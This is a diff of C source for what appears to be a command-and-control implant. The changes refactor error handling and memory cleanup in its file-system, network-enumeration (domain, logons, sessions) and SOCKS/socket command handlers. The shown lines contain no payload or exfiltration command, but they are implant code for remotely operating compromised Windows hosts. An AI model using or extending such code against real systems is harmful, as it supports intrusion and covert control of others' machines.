@@ -731,7 +731,7 @@ VOID CommandFS( PPARSER Parser )
                 Instance.Win32.FindClose( hFile );
 
                 PUTS( "LEAVE" )
-                goto LEAVE;
+                goto CLEAR_LEAVE;
             }
 
             do
@@ -849,7 +849,7 @@ VOID CommandFS( PPARSER Parser )
             }
 
             if ( ! Success )
-                goto LEAVE;
+                goto CLEAR_LEAVE;
 
             break;
         }
@@ -915,7 +915,7 @@ VOID CommandFS( PPARSER Parser )
             }
 
             if ( ! Success ) {
-                goto LEAVE;
+                goto CLEAR_LEAVE;
             }
 
             break;
@@ -928,7 +928,7 @@ VOID CommandFS( PPARSER Parser )
 
             if ( ! Instance.Win32.SetCurrentDirectoryW( Path ) ) {
                 PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
-                goto LEAVE;
+                goto CLEAR_LEAVE;
             } else {
                 PackageAddWString( Package, Path );
             }
@@ -946,7 +946,7 @@ VOID CommandFS( PPARSER Parser )
             {
                 if ( ! Instance.Win32.RemoveDirectoryW( Path ) ) {
                     PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
-                    goto LEAVE;
+                    goto CLEAR_LEAVE;
                 } else {
                     PackageAddInt32( Package, TRUE );
                 }
@@ -955,7 +955,7 @@ VOID CommandFS( PPARSER Parser )
             {
                 if ( ! Instance.Win32.DeleteFileW( Path ) ) {
                     PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
-                    goto LEAVE;
+                    goto CLEAR_LEAVE;
                 } else {
                     PackageAddInt32( Package, FALSE );
                 }
@@ -974,7 +974,7 @@ VOID CommandFS( PPARSER Parser )
             if ( ! Instance.Win32.CreateDirectoryW( Path, NULL ) )
             {
                 PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
-                goto LEAVE;
+                goto CLEAR_LEAVE;
             }
 
             PackageAddWString( Package, Path );
@@ -998,6 +998,7 @@ VOID CommandFS( PPARSER Parser )
             Success = Instance.Win32.CopyFileW( PathFrom, PathTo, FALSE );
             if ( ! Success ) {
                 PACKAGE_ERROR_WIN32
+                goto CLEAR_LEAVE;
             }
 
             PackageAddInt32( Package, Success );
@@ -1014,7 +1015,7 @@ VOID CommandFS( PPARSER Parser )
 
             if ( ! ( Return = Instance.Win32.GetCurrentDirectoryW( MAX_PATH * 2, Path ) ) ) {
                 PRINTF( "Failed to get current dir: %d\n", NtGetLastError() );
-                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() ); 
             } else {
                 PackageAddWString( Package, Path );
             }
@@ -1054,12 +1055,11 @@ VOID CommandFS( PPARSER Parser )
         }
     }
 
-    PUTS( "Transmit package" )
     PackageTransmit( Package );
+    return;
 
-LEAVE:
-    PUTS( "PackageDestroy" )
-    PackageDestroy( Package );
+CLEAR_LEAVE:
+    PackageDestroy( Package ); Package = NULL;
 }
 
 VOID CommandInlineExecute( PPARSER Parser )
@@ -2050,21 +2050,26 @@ VOID CommandNet( PPARSER Parser )
                 {
                     if ( ! Instance.Win32.GetComputerNameExA( ComputerNameDnsDomain, Domain, &Length ) )
                     {
-                        PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
-                        PackageDestroy( Package );
+                       PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+                       goto DOMAIN_CLEANUP;
                     }
                 }
+                else
+                    goto DOMAIN_CLEANUP;
             }
+            else
+                goto DOMAIN_CLEANUP;
 
             PackageAddString( Package, Domain );
 
-            if ( Domain )
-            {
-                MemSet( Domain, 0, Length );
-                Instance.Win32.LocalFree( Domain );
-            }
+            DATA_FREE( Domain, Length );
 
             break;
+
+        DOMAIN_CLEANUP:
+            DATA_FREE( Domain, Length );
+            PackageDestroy( Package ); Package = NULL;
+            return;
         }
 
         case DEMON_NET_COMMAND_LOGONS:
@@ -2124,7 +2129,7 @@ VOID CommandNet( PPARSER Parser )
             if ( UserInfo != NULL )
                 Instance.Win32.NetApiBufferFree( UserInfo );
 
-            PackageDestroy( Package );
+            PackageDestroy( Package ); Package = NULL;
             return;
         }
 
@@ -2169,7 +2174,7 @@ VOID CommandNet( PPARSER Parser )
                     goto SESSION_CLEANUP;
                 }
 
-                if ( SessionInfo != NULL )
+                if ( SessionInfo )
                 {
                     Instance.Win32.NetApiBufferFree( SessionInfo );
                     SessionInfo = NULL;
@@ -2183,10 +2188,10 @@ VOID CommandNet( PPARSER Parser )
             break;
 
         SESSION_CLEANUP:
-            if ( SessionInfo != NULL )
+            if ( SessionInfo )
                 Instance.Win32.NetApiBufferFree( SessionInfo );
 
-            PackageDestroy( Package );
+            PackageDestroy( Package ); Package = NULL;
             return;
         }
 
@@ -2745,10 +2750,8 @@ VOID CommandSocket( PPARSER Parser )
 
                     /* we don't want to send the message now.
                      * send it while we are free and closing the socket. */
-                    PackageDestroy( Package );
-                    Package = NULL;
-
-                    break;
+                    PackageDestroy( Package ); Package = NULL;
+                    return;
                 }
 
                 Socket = Socket->Next;
@@ -2774,10 +2777,8 @@ VOID CommandSocket( PPARSER Parser )
 
             /* we don't want to send the message now.
              * send it while we are free and closing the sockets. */
-            PackageDestroy( Package );
-            Package = NULL;
-
-            break;
+            PackageDestroy( Package ); Package = NULL;
+            return;
         }
 
         case SOCKET_COMMAND_SOCKSPROXY_ADD: PUTS( "Socket::SocksProxyAdd" )
@@ -2833,8 +2834,7 @@ VOID CommandSocket( PPARSER Parser )
             if ( Success )
             {
                 /* destroy the package and exit this command function */
-                PackageDestroy( Package );
-                Package = NULL;
+                PackageDestroy( Package ); Package = NULL;
                 return;
             }
             else
@@ -2970,7 +2970,7 @@ VOID CommandSocket( PPARSER Parser )
             }
 
             /* destroy the package and exit this command function */
-            PackageDestroy( Package );
+            PackageDestroy( Package ); Package = NULL;
 
             return;
         }
